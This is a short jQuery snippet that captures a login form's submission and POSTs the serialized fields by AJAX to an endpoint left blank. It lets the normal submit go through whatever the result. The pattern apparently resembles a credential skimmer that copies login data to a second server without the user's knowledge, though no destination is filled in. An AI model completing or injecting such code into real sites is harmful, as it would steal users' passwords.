$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "http://",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
